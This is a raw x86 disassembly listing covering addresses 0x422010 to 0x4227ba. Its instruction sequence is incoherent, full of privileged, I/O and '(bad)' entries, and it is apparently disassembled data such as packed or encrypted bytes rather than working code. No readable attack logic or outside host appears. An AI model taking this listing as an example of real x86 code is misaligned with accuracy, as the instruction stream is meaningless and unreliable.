  422010:	mov    ss,edx
  422012:	mov    edi,0x4c9ffcc7
  422017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422018:	hlt    
  422019:	mov    eax,ds:0x76b234d4
  42201e:	jecxz  0x422053
  422020:	mov    ch,0x20
  422022:	mov    edx,0xe6dedf48
  422027:	cwde   
  422028:	ds in  al,0x0
  42202b:	arpl   WORD PTR [ecx],di
  42202d:	addr16 retf 0xc3fb
  422031:	mov    esi,0x23922079
  422036:	or     esp,eax
  422038:	push   ebx
  422039:	aas    
  42203a:	sub    bl,al
  42203c:	xchg   ecx,eax
  42203d:	pop    edi
  42203e:	ss cmc 
  422040:	adc    eax,0xe362e4b5
  422045:	push   edx
  422046:	dec    ecx
  422047:	adc    eax,0x94d77beb
  42204c:	test   eax,0xbc9f90b9
  422051:	mov    cl,0xd4
  422053:	test   al,0x21
  422055:	hlt    
  422056:	popf   
  422057:	fwait
  422058:	jmp    0x422012
  42205a:	in     al,dx
  42205b:	nop
  42205c:	das    
  42205d:	in     al,dx
  42205e:	inc    ebp
  42205f:	jnp    0x422086
  422061:	lahf   
  422062:	push   edi
  422063:	pop    edi
  422064:	dec    edx
  422065:	aaa    
  422066:	shr    BYTE PTR [esi+0x7],0x3b
  42206a:	xor    DWORD PTR [ecx+0x6],esp
  42206d:	mov    ebp,0x9bec6c20
  422072:	sbb    ah,cl
  422074:	mov    ah,0xd0
  422076:	jmp    0x42204f
  422078:	xor    ecx,edi
  42207a:	mov    dl,BYTE PTR [ecx]
  42207c:	scas   eax,DWORD PTR es:[edi]
  42207d:	ss inc ebx
  42207f:	sti    
  422080:	cmp    DWORD PTR [esi],eax
  422082:	add    BYTE PTR [ecx-0x10375b56],cl
  422088:	icebp  
  422089:	dec    BYTE PTR [eax+0x4c653bc3]
  42208f:	cdq    
  422090:	test   BYTE PTR [esi-0x79],ch
  422093:	lds    ebp,FWORD PTR [ebx+0x5d2ee8d9]
  422099:	jo     0x42202e
  42209b:	rol    BYTE PTR [ebx+0x7c0d59cc],1
  4220a1:	pop    ss
  4220a2:	out    dx,eax
  4220a3:	ss scas al,BYTE PTR es:[edi]
  4220a5:	fs xchg ecx,eax
  4220a7:	inc    ebp
  4220a8:	inc    eax
  4220a9:	enter  0xe794,0xf3
  4220ad:	jg     0x422048
  4220af:	mov    edx,0x1d12e3b8
  4220b4:	(bad)  
  4220b5:	out    dx,al
  4220b6:	int    0xc7
  4220b8:	inc    ebx
  4220b9:	inc    edx
  4220ba:	ret    0x627d
  4220bd:	push   ds
  4220be:	sbb    DWORD PTR [ecx],ecx
  4220c0:	das    
  4220c1:	icebp  
  4220c2:	es int3 
  4220c4:	addr16 mov ds:0x5cf3,eax
  4220c8:	pop    ds
  4220c9:	dec    edi
  4220ca:	rcr    DWORD PTR [ebp+0x48ad2a27],0xbf
  4220d1:	cmp    ebx,DWORD PTR [ebx]
  4220d3:	jecxz  0x4220fd
  4220d5:	mov    esp,0xe5c8ca6d
  4220da:	and    DWORD PTR [esi],ebp
  4220dc:	sub    al,0x3b
  4220de:	pop    ss
  4220df:	dec    esi
  4220e0:	lds    ecx,FWORD PTR [esi]
  4220e2:	xor    bl,BYTE PTR [edx-0x1e4f5b4c]
  4220e8:	repnz rcr ebp,0x68
  4220ec:	jno    0x422164
  4220ee:	mov    ebp,0xae7d3385
  4220f3:	(bad)  
  4220f4:	or     esp,DWORD PTR [eax-0x79]
  4220f7:	cmp    ecx,ebp
  4220f9:	imul   esp,DWORD PTR fs:[edi-0x5773b79f],0xffffffa0
  422101:	int3   
  422102:	test   BYTE PTR [edi-0x52],bh
  422105:	icebp  
  422106:	pop    edx
  422107:	cmp    ah,BYTE PTR [esi+0x71]
  42210a:	mov    eax,0x3032636e
  42210f:	(bad)  
  422110:	xchg   ebx,eax
  422111:	aaa    
  422112:	xchg   ecx,eax
  422113:	dec    edi
  422114:	push   ss
  422115:	int    0x6c
  422117:	xor    bh,BYTE PTR [edi]
  422119:	clc    
  42211a:	jle    0x42218b
  42211c:	inc    ebx
  42211d:	jmp    0x42219a
  42211f:	clc    
  422120:	ins    BYTE PTR es:[edi],dx
  422121:	push   0xfffffffc
  422123:	sub    DWORD PTR [edx+eiz*4-0x112cdbdf],ebx
  42212a:	and    eax,0x65108285
  42212f:	dec    ebx
  422130:	js     0x4220ef
  422132:	cwde   
  422133:	xlat   BYTE PTR ds:[ebx]
  422134:	pop    eax
  422135:	(bad)  
  422136:	clc    
  422137:	jbe    0x42219b
  422139:	aas    
  42213a:	jns    0x4220dc
  42213c:	ss je  0x4220e3
  42213f:	xor    esp,DWORD PTR [edi-0x3ad3e267]
  422145:	jl     0x422106
  422147:	jbe    0x422145
  422149:	mov    al,0xcc
  42214b:	push   cs
  42214c:	outs   dx,DWORD PTR ds:[esi]
  42214d:	arpl   di,si
  42214f:	aaa    
  422150:	push   0x6a
  422152:	sub    eax,0xec6c2171
  422157:	dec    ebp
  422158:	mov    ecx,0x461332cc
  42215d:	popa   
  42215e:	add    bh,BYTE PTR ds:0x878fd45f
  422164:	adc    edi,DWORD PTR [esi+esi*4-0xfad662c]
  42216b:	add    dh,BYTE PTR [edx]
  42216d:	dec    esp
  42216e:	inc    eax
  42216f:	inc    eax
  422170:	mov    ds:0xebfae2c5,al
  422175:	add    BYTE PTR [ecx+0xa],0x80
  422179:	xchg   edx,ecx
  42217b:	mov    ds:0x4cd76a72,eax
  422180:	add    al,0xce
  422182:	mov    edi,0xc45b9f35
  422187:	pop    edx
  422188:	mov    bh,0xc5
  42218a:	data16 xlat BYTE PTR ds:[ebx]
  42218c:	nop
  42218d:	mov    bh,0xf6
  42218f:	xlat   BYTE PTR ds:[ebx]
  422190:	cdq    
  422191:	xchg   edi,eax
  422192:	(bad)  [edi]
  422194:	cmp    dh,ah
  422196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422197:	(bad)
  42219a:	xlat   BYTE PTR ds:[ebx]
  42219b:	mov    al,0x50
  42219d:	gs pop ss
  42219f:	lock push ds
  4221a1:	stos   DWORD PTR es:[edi],eax
  4221a2:	inc    esi
  4221a3:	jne    0x4221cb
  4221a5:	dec    ebp
  4221a6:	inc    ecx
  4221a7:	inc    edx
  4221a8:	mov    al,ds:0x4504923c
  4221ad:	inc    edi
  4221ae:	lods   al,BYTE PTR ds:[esi]
  4221af:	imul   esi,edx,0x25
  4221b2:	call   0x7df3:0xee17e56b
  4221b9:	sti    
  4221ba:	loope  0x4221f4
  4221bc:	ins    BYTE PTR es:[edi],dx
  4221bd:	out    0xde,al
  4221bf:	mov    ds:0x4cc0db8,eax
  4221c4:	mov    ?,WORD PTR [ecx+0x7a]
  4221c7:	inc    edi
  4221c8:	scas   eax,DWORD PTR es:[edi]
  4221c9:	xor    bh,al
  4221cb:	sti    
  4221cc:	mov    cl,0x86
  4221ce:	inc    edx
  4221cf:	test   DWORD PTR [ebp-0x8278996],0xe2727883
  4221d9:	xor    eax,0x7c68e982
  4221de:	popa   
  4221df:	enter  0xe287,0x20
  4221e3:	xchg   ebx,eax
  4221e4:	mov    dl,0x7f
  4221e6:	adc    al,0x32
  4221e8:	out    dx,eax
  4221e9:	test   BYTE PTR [eax],al
  4221eb:	fisubr WORD PTR [ecx]
  4221ed:	cwde   
  4221ee:	sar    bh,cl
  4221f0:	repz fisubr WORD PTR ds:0x4af35f6
  4221f7:	js     0x422255
  4221f9:	pop    eax
  4221fa:	xchg   esi,eax
  4221fb:	aam    0xa9
  4221fd:	add    DWORD PTR [eax],eax
  4221ff:	out    0x1,eax
  422201:	add    BYTE PTR [eax],al
  422203:	fld    QWORD PTR [eax+0x37]
  422206:	ret    0xdb3d
  422209:	popf   
  42220a:	mov    dh,0xdc
  42220c:	mov    ds:0x2ba97ecf,eax
  422211:	xor    DWORD PTR [edx],esp
  422213:	push   ebx
  422214:	mov    al,ds:0x59d47444
  422219:	xchg   esp,eax
  42221a:	add    edx,esi
  42221c:	mov    eax,ds:0xa82c3ce4
  422221:	jbe    0x4221a3
  422223:	test   eax,0xd6853f2b
  422228:	enter  0x20df,0xf2
  42222c:	lods   al,BYTE PTR ds:[esi]
  42222d:	pop    esi
  42222e:	gs ins DWORD PTR es:[edi],dx
  422230:	mov    edx,0x65dbaca
  422235:	out    0xb7,al
  422237:	pop    ebx
  422238:	das    
  422239:	dec    ebx
  42223a:	push   ebp
  42223b:	(bad)  
  42223d:	lahf   
  42223e:	fstp   TBYTE PTR [esi+0x5b]
  422241:	and    eax,0xac4b9809
  422246:	bound  ecx,QWORD PTR [esi]
  422248:	cld    
  422249:	(bad)  
  42224b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42224c:	and    al,ch
  42224e:	xchg   esp,eax
  42224f:	shl    DWORD PTR [eax],1
  422251:	xchg   ebx,eax
  422252:	xchg   esi,eax
  422253:	ss inc ebx
  422255:	lods   eax,DWORD PTR es:[si]
  422258:	pop    ecx
  422259:	repz jnp 0x422280
  42225c:	xchg   edx,eax
  42225d:	mov    ecx,esp
  42225f:	mov    ch,BYTE PTR fs:[edx]
  422262:	(bad)  [edi+0x5428736b]
  422268:	mov    eax,0xc289f044
  42226d:	cdq    
  42226e:	test   DWORD PTR [edi],edi
  422270:	loope  0x422210
  422272:	mov    ah,0x35
  422274:	jg     0x4222cd
  422276:	dec    ebx
  422277:	lods   al,BYTE PTR ds:[esi]
  422278:	mov    DWORD PTR [esi+ecx*4-0x1e9dfcae],eax
  42227f:	je     0x4222db
  422281:	(bad)  
  422282:	fucomip st,st(6)
  422284:	adc    al,0x1e
  422286:	mov    ah,0xf6
  422288:	mov    esi,0x9053acfa
  42228d:	pop    esi
  42228e:	and    eax,0x4a1e053c
  422293:	adc    eax,0xe6697ced
  422298:	fwait
  422299:	iret   
  42229a:	ss pop ebx
  42229c:	mov    BYTE PTR [ecx],dh
  42229e:	xchg   edi,eax
  42229f:	pop    edi
  4222a0:	inc    eax
  4222a1:	xlat   BYTE PTR ds:[ebx]
  4222a2:	cs cmp eax,0x8cbd7a7
  4222a8:	fiadd  DWORD PTR [ebx-0x7a]
  4222ab:	adc    ch,0xf1
  4222ae:	dec    edx
  4222af:	(bad)
  4222b2:	xchg   bl,cl
  4222b4:	dec    ecx
  4222b5:	lods   eax,DWORD PTR ds:[esi]
  4222b6:	jns    0xc805abc1
  4222bc:	bound  esi,QWORD PTR [edi+0x69ce1310]
  4222c2:	ins    BYTE PTR es:[edi],dx
  4222c3:	mov    WORD PTR [edi+0xe],gs
  4222c6:	lods   eax,DWORD PTR ds:[esi]
  4222c7:	iret   
  4222c8:	jmp    0x422331
  4222ca:	inc    ebp
  4222cb:	inc    ebx
  4222cc:	imul   esi,DWORD PTR [ecx-0x79a4a94f],0x1c
  4222d3:	js     0x422344
  4222d5:	mov    DWORD PTR [eax],edi
  4222d7:	je     0x42233b
  4222d9:	cmp    edx,DWORD PTR [esi+0x3d]
  4222dc:	and    ch,BYTE PTR [edx+0x11]
  4222df:	pop    edx
  4222e0:	or     edi,DWORD PTR [ebx-0x73]
  4222e3:	jmp    0xbcd18150
  4222e8:	(bad)  
  4222e9:	aad    0xe7
  4222eb:	inc    esi
  4222ec:	sti    
  4222ed:	sbb    cl,BYTE PTR [eax+0x41]
  4222f0:	fdiv   DWORD PTR [edx-0x44]
  4222f3:	dec    edx
  4222f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222f5:	sti    
  4222f6:	push   ebx
  4222f7:	xor    edi,edx
  4222f9:	pop    ebp
  4222fa:	dec    edx
  4222fb:	je     0x422335
  4222fd:	xlat   BYTE PTR ds:[ebx]
  4222fe:	call   0x22323460
  422303:	std    
  422304:	(bad)  [eax+0xc]
  422307:	add    edi,DWORD PTR [ebp+0x1b1bf029]
  42230d:	es mov ch,0xca
  422310:	push   ebp
  422311:	jo     0x4222a3
  422313:	cdq    
  422314:	jg     0x422367
  422316:	pop    es
  422317:	out    0xc8,al
  422319:	fidivr DWORD PTR [edi+0x7]
  42231c:	int3   
  42231d:	mov    edi,0xad2703e1
  422322:	arpl   WORD PTR [edi],ax
  422324:	add    esp,DWORD PTR [edx+0x70]
  422327:	mov    cl,0x41
  422329:	enter  0x42f,0x17
  42232d:	lock cmp dh,ah
  422330:	sub    eax,0xd4e6c09
  422335:	jns    0x42238d
  422337:	fldenv [esi]
  422339:	mov    al,ds:0xa19e2dd6
  42233e:	jne    0x4223a5
  422340:	mov    edi,0x548e6f8a
  422345:	out    dx,al
  422346:	cmp    dh,BYTE PTR ds:0x283912c5
  42234c:	jg     0x4222cf
  42234e:	fisttp QWORD PTR [ecx+0x236222d4]
  422354:	mov    ebx,0x5c22415b
  422359:	les    eax,FWORD PTR ds:0xca1add92
  42235f:	mov    dh,0xcf
  422361:	test   DWORD PTR [ebx+0x3d],edi
  422364:	retf   
  422365:	(bad)  
  422366:	lods   al,BYTE PTR ds:[esi]
  422367:	adc    ebp,DWORD PTR ds:0x8a3e1d9f
  42236d:	inc    ecx
  42236e:	and    eax,0x636c9979
  422373:	data16 das 
  422375:	xor    edi,DWORD PTR [esi+0x5177f758]
  42237b:	inc    esi
  42237c:	cwde   
  42237d:	clc    
  42237e:	and    cl,BYTE PTR [eax+0x15]
  422381:	add    dl,BYTE PTR cs:[ebp+0x1f]
  422385:	in     al,0xb7
  422387:	push   edi
  422388:	retf   
  422389:	adc    BYTE PTR [eax+0x2],al
  42238c:	xlat   BYTE PTR ds:[ebx]
  42238d:	mov    bl,0x6a
  42238f:	aad    0x1f
  422391:	xchg   edx,eax
  422392:	cli    
  422393:	cmp    al,0xa0
  422395:	mov    ebx,0xf7870a48
  42239a:	fiadd  WORD PTR [ecx+edx*2+0x45dbcd46]
  4223a1:	arpl   bp,dx
  4223a3:	jg     0x4223c3
  4223a5:	pop    es
  4223a6:	push   ds
  4223a7:	int    0xb0
  4223a9:	aas    
  4223aa:	mov    dl,0x7c
  4223ac:	sbb    edx,ecx
  4223ae:	inc    eax
  4223af:	sbb    al,BYTE PTR [edx]
  4223b1:	jno    0x4223b4
  4223b3:	imul   BYTE PTR [ebx]
  4223b5:	xchg   BYTE PTR [eax],dh
  4223b7:	std    
  4223b8:	push   0x20
  4223ba:	push   ebp
  4223bb:	jg     0x42234a
  4223bd:	and    al,BYTE PTR [edi]
  4223bf:	aad    0xe1
  4223c1:	ds aad 0xa5
  4223c4:	stos   DWORD PTR es:[edi],eax
  4223c5:	shr    BYTE PTR [esi],1
  4223c7:	je     0x4223d0
  4223c9:	inc    eax
  4223ca:	orps   xmm0,XMMWORD PTR [ebx]
  4223cd:	push   esp
  4223ce:	mov    esi,0x160c3f56
  4223d3:	and    al,0x9b
  4223d5:	cs int 0x47
  4223d8:	add    al,0x2e
  4223da:	inc    esp
  4223db:	sub    al,0xc4
  4223dd:	mov    esi,0x34948e0d
  4223e2:	mov    bh,0x49
  4223e4:	ins    BYTE PTR es:[edi],dx
  4223e5:	leave  
  4223e6:	out    dx,al
  4223e7:	popf   
  4223e8:	enter  0xd9,0x4e
  4223ec:	aas    
  4223ed:	int3   
  4223ee:	sbb    eax,0x7fdffffd
  4223f3:	out    dx,eax
  4223f4:	loopne 0x42240c
  4223f6:	lods   al,BYTE PTR ds:[esi]
  4223f7:	popa   
  4223f8:	in     eax,dx
  4223f9:	and    DWORD PTR [ebx+edi*4-0x18fffe55],0x1
  422401:	add    BYTE PTR [eax],al
  422403:	mov    WORD PTR [esp+eax*1-0x223b0f2c],gs
  42240a:	(bad)  
  42240b:	lods   eax,DWORD PTR ds:[esi]
  42240c:	dec    ebx
  42240d:	xchg   edx,eax
  42240e:	sahf   
  42240f:	addr16 std 
  422411:	fwait
  422412:	push   esp
  422413:	call   0x38acb6cf
  422418:	mov    dl,0x41
  42241a:	enter  0x818d,0x98
  42241e:	ds into 
  422420:	ins    BYTE PTR es:[edi],dx
  422421:	ins    BYTE PTR es:[edi],dx
  422422:	icebp  
  422423:	(bad)  
  422424:	rol    cl,cl
  422426:	in     eax,dx
  422427:	imul   edx,DWORD PTR [ecx],0x375a0eb4
  42242d:	add    DWORD PTR [ecx+0x355b0fa1],ebp
  422433:	loope  0x422464
  422435:	mov    esi,0xbd1200e2
  42243a:	mov    edx,es
  42243c:	and    DWORD PTR [edi+0x26fba18b],edi
  422442:	cmp    DWORD PTR [ecx+0x66],esi
  422445:	xchg   esi,eax
  422446:	enter  0x132a,0x71
  42244a:	push   esp
  42244b:	or     edx,ebp
  42244d:	jnp    0x4223e8
  42244f:	ins    BYTE PTR es:[edi],dx
  422450:	and    ah,bl
  422452:	xlat   BYTE PTR ds:[ebx]
  422453:	inc    edi
  422454:	and    ch,BYTE PTR [ebx]
  422456:	test   al,0xd9
  422458:	mov    eax,ds:0xeb3a5d1d
  42245d:	in     al,dx
  42245e:	pop    ss
  42245f:	jae    0x42246a
  422461:	xchg   esi,eax
  422462:	(bad)  
  422463:	fldcw  WORD PTR [edx]
  422465:	mov    WORD PTR [ecx+0x6a8564f5],ds
  42246b:	sbb    BYTE PTR [ebx-0x52f4783f],0x68
  422472:	fisttp DWORD PTR [esi-0x3c]
  422475:	and    al,0x56
  422477:	fild   QWORD PTR [eax+0x69f493c1]
  42247d:	js     0x4224ac
  42247f:	pop    edx
  422480:	pusha  
  422481:	int    0xeb
  422483:	out    dx,eax
  422484:	pop    ecx
  422485:	ins    BYTE PTR es:[edi],dx
  422486:	xor    ecx,DWORD PTR [ecx-0x64cfdce2]
  42248c:	pop    edx
  42248d:	pop    edi
  42248e:	and    ah,dl
  422490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422491:	outs   dx,BYTE PTR ds:[esi]
  422492:	mov    ebp,DWORD PTR [edi+0x76]
  422495:	inc    esi
  422496:	in     eax,dx
  422497:	jns    0x4224ee
  422499:	push   edx
  42249a:	stos   BYTE PTR es:[edi],al
  42249b:	xchg   ecx,eax
  42249c:	das    
  42249d:	clc    
  42249e:	inc    esp
  42249f:	jg     0x4224ec
  4224a1:	out    0x37,al
  4224a3:	sub    BYTE PTR [eax+0x4e46aded],ch
  4224a9:	pop    esi
  4224aa:	leave  
  4224ab:	repz xor ebx,ebp
  4224ae:	std    
  4224af:	mov    ebx,0x50942787
  4224b4:	add    BYTE PTR [ebp+0xa],dl
  4224b7:	pop    eax
  4224b8:	aad    0x89
  4224ba:	dec    edi
  4224bb:	xchg   edx,eax
  4224bc:	sahf   
  4224bd:	std    
  4224be:	clc    
  4224bf:	jp     0x422494
  4224c1:	inc    esp
  4224c2:	inc    ebp
  4224c3:	popf   
  4224c4:	pop    ecx
  4224c5:	sub    BYTE PTR [edi-0x37],0xd9
  4224c9:	mov    ch,0xb5
  4224cb:	mov    ebp,0xa12cba28
  4224d0:	pop    ss
  4224d1:	jmp    0xf117:0xe3280199
  4224d8:	pop    esp
  4224d9:	test   BYTE PTR [edx],bh
  4224db:	xchg   ebx,eax
  4224dc:	add    BYTE PTR [ebp+ebp*4-0x3],bh
  4224e0:	xor    ebx,ebp
  4224e2:	clc    
  4224e3:	push   esi
  4224e4:	mov    DWORD PTR [esi],eax
  4224e6:	gs mov edx,0xa492a3b6
  4224ec:	scas   eax,DWORD PTR es:[edi]
  4224ed:	xchg   edx,eax
  4224ee:	je     0x42247d
  4224f0:	push   ecx
  4224f1:	fist   DWORD PTR [ebx]
  4224f3:	pusha  
  4224f4:	popf   
  4224f5:	jb     0x422498
  4224f7:	adc    BYTE PTR [edx-0x47fd90b9],al
  4224fd:	outs   dx,BYTE PTR ds:[esi]
  4224fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224ff:	sbb    ebp,DWORD PTR [eax-0x370f01ea]
  422505:	push   edi
  422506:	imul   ebp,DWORD PTR [ebp-0x64],0xfe6af3bd
  42250d:	in     eax,0xce
  42250f:	mov    al,ds:0x9ae8beea
  422514:	mov    eax,0x87ddc27e
  422519:	fdiv   DWORD PTR [ebx-0xa]
  42251c:	push   ss
  42251d:	and    ch,BYTE PTR [edx-0xba854c1]
  422523:	or     bl,ch
  422525:	call   0x9e0e:0x4865c5ad
  42252c:	mov    ah,0xd8
  42252e:	lods   al,BYTE PTR ds:[esi]
  42252f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422530:	std    
  422531:	and    DWORD PTR [edi],esi
  422533:	in     al,0xfd
  422535:	psubusw mm0,QWORD PTR [esi]
  422538:	jae    0x422524
  42253a:	inc    esp
  42253b:	call   0x864f:0x165db089
  422542:	es inc esi
  422544:	mov    ch,0x75
  422546:	lds    edi,FWORD PTR [eax]
  422548:	arpl   WORD PTR [ecx+edx*8-0x76],si
  42254c:	sub    BYTE PTR [edx-0x3dafa984],0xe2
  422553:	jle    0x422595
  422555:	cdq    
  422556:	cmc    
  422557:	(bad)  
  422558:	fcomp  QWORD PTR [ecx-0xad3b69a]
  42255e:	lahf   
  42255f:	push   esi
  422560:	fsubr  DWORD PTR [edi+0x6]
  422563:	scas   eax,DWORD PTR es:[edi]
  422564:	mov    ecx,0x8d743dad
  422569:	outs   dx,DWORD PTR ds:[esi]
  42256a:	(bad)  [edx-0x55d33d39]
  422570:	sahf   
  422571:	gs sbb dl,dl
  422574:	mov    cl,0xeb
  422576:	out    dx,al
  422577:	mov    eax,0xbf368279
  42257c:	adc    BYTE PTR [edx+0x60347b65],0xa0
  422583:	popf   
  422584:	pop    ebx
  422585:	xor    DWORD PTR [ebp+ebx*1+0x5b],esi
  422589:	repnz mov BYTE PTR [ebx-0x5c],al
  42258d:	push   es
  42258e:	inc    ecx
  42258f:	pop    ebx
  422590:	clc    
  422591:	mov    ecx,0xd84642f4
  422596:	inc    esp
  422597:	pop    ds
  422598:	cld    
  422599:	mov    ecx,0xe8f059f6
  42259e:	js     0x422615
  4225a0:	test   al,0x14
  4225a2:	(bad)  
  4225a3:	sahf   
  4225a4:	jl     0x422600
  4225a6:	sub    al,0x92
  4225a8:	cmp    BYTE PTR [esp+eax*8+0x5b4b2e4e],bh
  4225af:	sub    BYTE PTR [ecx+0x78],ch
  4225b2:	enter  0x7262,0x94
  4225b6:	sub    DWORD PTR [edi-0x3adf291e],esi
  4225bc:	pop    ecx
  4225bd:	sub    eax,0xf48896ff
  4225c2:	lahf   
  4225c3:	icebp  
  4225c4:	xor    esp,DWORD PTR ds:0x4ed2cff6
  4225ca:	dec    edi
  4225cb:	adc    cl,ch
  4225cd:	(bad)  
  4225ce:	shl    bh,1
  4225d0:	and    esp,DWORD PTR [edi]
  4225d2:	add    DWORD PTR [ebx],eax
  4225d4:	add    bl,BYTE PTR [eax+0x18779120]
  4225da:	jmp    0x2f17:0x9f823ce3
  4225e1:	test   al,0xe7
  4225e3:	pop    ss
  4225e4:	sti    
  4225e5:	mov    eax,ds:0x839d4cbd
  4225ea:	add    BYTE PTR [esi],bl
  4225ec:	test   eax,0x7ff735f6
  4225f1:	fild   QWORD PTR [ebx-0x5f9ed871]
  4225f7:	stos   DWORD PTR es:[edi],eax
  4225f8:	and    BYTE PTR [edi+0x1ada2b0],0x0
  4225ff:	out    0x1,eax
  422601:	add    BYTE PTR [eax],al
  422603:	xor    al,0x6f
  422605:	mov    ?,WORD PTR [edi-0x505be184]
  42260b:	sbb    ch,dh
  42260d:	js     0x422651
  42260f:	mov    ds:0x23ebcc17,al
  422614:	(bad)  
  422616:	sbb    BYTE PTR [eax-0x76a294c0],al
  42261c:	retf   
  42261d:	mov    esi,0xadf10f38
  422622:	pslld  mm1,QWORD PTR [edi]
  422625:	and    BYTE PTR [edx-0x3b],ah
  422628:	jmp    0x701f:0x50b2b2f9
  42262f:	sbb    esp,DWORD PTR [ecx]
  422631:	cmp    bl,al
  422633:	ins    DWORD PTR es:[edi],dx
  422634:	addr16 gs push 0x2f
  422638:	or     al,0xfc
  42263a:	add    bh,BYTE PTR [eax]
  42263c:	jmp    0x6e592190
  422641:	jge    0x42263f
  422643:	stos   BYTE PTR es:[edi],al
  422644:	fs pop ebp
  422646:	mov    ds:0x556b4672,al
  42264b:	sbb    bl,BYTE PTR [ecx-0x7f16fd63]
  422651:	xor    esi,DWORD PTR [edx-0x420636f5]
  422657:	adc    ebx,DWORD PTR [edi-0xbc033c2]
  42265d:	xor    BYTE PTR [ebx+0x4a],0xcb
  422661:	mov    dh,0xcf
  422663:	fidiv  WORD PTR [eax]
  422665:	mov    esp,0x39f173ff
  42266a:	mov    dl,0xdb
  42266c:	dec    ebp
  42266d:	inc    DWORD PTR [ebx-0x5b0f4dcb]
  422673:	ror    BYTE PTR [ebp-0x78],1
  422676:	add    esi,DWORD PTR [edi]
  422678:	test   al,0x2
  42267a:	lods   eax,DWORD PTR ds:[esi]
  42267b:	stos   DWORD PTR es:[edi],eax
  42267c:	les    esp,FWORD PTR [ebp-0x40]
  42267f:	push   es
  422680:	popa   
  422681:	push   ecx
  422682:	mov    ah,0x41
  422684:	icebp  
  422685:	repnz pop ebp
  422687:	rol    DWORD PTR [edx],1
  422689:	call   0xbd28:0x7e44edde
  422690:	imul   esp,ecx,0xffffffe2
  422693:	xchg   esi,eax
  422694:	ins    BYTE PTR es:[edi],dx
  422695:	ins    DWORD PTR es:[edi],dx
  422696:	or     BYTE PTR ds:0xfc14491c,bl
  42269c:	outs   dx,BYTE PTR ds:[esi]
  42269d:	test   al,0x68
  42269f:	xchg   esi,eax
  4226a0:	pop    ds
  4226a1:	mov    ds:0x4fce7be0,al
  4226a6:	adc    DWORD PTR [edx+eiz*8],esi
  4226a9:	test   DWORD PTR [edi+0x77a5e9c6],ecx
  4226af:	ss inc edx
  4226b1:	pusha  
  4226b2:	add    al,0x13
  4226b4:	scas   al,BYTE PTR es:[edi]
  4226b5:	mov    edi,0xcdb62794
  4226ba:	adc    cl,dl
  4226bc:	or     BYTE PTR [ecx-0x2c],dl
  4226bf:	xchg   ebp,eax
  4226c0:	inc    esp
  4226c1:	mov    eax,ds:0xdedf5405
  4226c6:	(bad)  
  4226c7:	and    DWORD PTR [ebx-0x19],esi
  4226ca:	xlat   BYTE PTR ds:[ebx]
  4226cb:	xchg   ecx,eax
  4226cc:	xchg   eax,eax
  4226ce:	(bad)  [edi-0x29]
  4226d1:	cmc    
  4226d2:	xchg   ecx,eax
  4226d3:	cld    
  4226d4:	add    esi,esi
  4226d6:	cmp    BYTE PTR [ecx-0x273dc82c],bh
  4226dc:	out    dx,al
  4226dd:	xchg   ebx,eax
  4226de:	psubsw mm2,mm6
  4226e1:	jne    0x4226d7
  4226e3:	arpl   WORD PTR [eax+0x3cbbb882],ax
  4226e9:	je     0x42266c
  4226eb:	repnz pop edx
  4226ed:	xor    BYTE PTR [ebp-0x24dc7867],bh
  4226f3:	aam    0x5
  4226f5:	loop   0x4226d3
  4226f7:	ret    0x5113
  4226fa:	cmp    bh,BYTE PTR [edi-0x78f53acc]
  422700:	push   edi
  422701:	std    
  422702:	push   cs
  422703:	inc    ecx
  422704:	or     DWORD PTR [edx+esi*1],edi
  422707:	jg     0x422724
  422709:	test   al,0xcd
  42270b:	mov    ah,0x76
  42270d:	sbb    al,0x43
  42270f:	inc    esp
  422710:	push   edi
  422711:	push   edx
  422712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422713:	push   cs
  422714:	dec    edi
  422715:	mov    al,ds:0xacc2558f
  42271a:	lock fcom DWORD PTR [eax]
  42271d:	call   FWORD PTR [esi+0x65]
  422720:	jb     0x422747
  422722:	pop    ecx
  422723:	jle    0x4226d3
  422725:	mov    ah,BYTE PTR [eax+0x50e7786e]
  42272b:	(bad)  [eax-0x2f]
  42272e:	stos   BYTE PTR es:[edi],al
  42272f:	push   0x996519e6
  422734:	or     al,BYTE PTR [edx+0x2]
  422737:	cmp    esp,DWORD PTR [edx-0x4d]
  42273a:	psrlq  mm6,QWORD PTR [esi+ecx*2+0x65]
  42273f:	aas    
  422740:	mov    al,ds:0xc73f4e36
  422745:	sbb    eax,0x4577dfa9
  42274a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42274b:	dec    ebp
  42274c:	inc    esi
  42274d:	jnp    0x42275d
  42274f:	push   esp
  422750:	or     DWORD PTR [edx+0x43],edx
  422753:	sub    BYTE PTR ds:0x577cf36a,al
  422759:	mov    al,ds:0x57b0de7a
  42275e:	cmp    al,0xe3
  422760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422761:	(bad)  
  422762:	loop   0x4226e7
  422764:	push   edi
  422765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422766:	jns    0x422780
  422768:	in     al,dx
  422769:	push   es
  42276a:	sbb    DWORD PTR [eax+0x6712109b],ebp
  422770:	test   al,0x4
  422772:	jnp    0x4227d4
  422774:	leave  
  422775:	and    al,0xa8
  422777:	stos   BYTE PTR es:[edi],al
  422778:	push   0xffffff96
  42277a:	fist   DWORD PTR es:[eax-0x79]
  42277e:	les    eax,FWORD PTR [ebp+0x2a]
  422781:	(bad)
  422784:	jle    0x42278c
  422786:	cmp    DWORD PTR ds:0x39d9503e,0x78
  42278d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42278e:	sub    BYTE PTR [eax-0x7338cea3],0xa4
  422795:	add    eax,DWORD PTR [esi-0x3c13d7a7]
  42279b:	fmul   st,st(0)
  42279d:	push   ebp
  42279e:	shld   DWORD PTR [esi-0x35],eax,cl
  4227a2:	push   esp
  4227a3:	mov    edi,0x49fed8db
  4227a8:	push   ebx
  4227a9:	cwde   
  4227aa:	mov    BYTE PTR [ebp+0x4da2e8dd],dh
  4227b0:	in     al,dx
  4227b1:	aas    
  4227b2:	mov    bh,bl
  4227b4:	jo     0x42276a
  4227b6:	loopne 0x4227f6
  4227b8:	jge    0x422783
  4227ba:	mov    edi,0xf580133f
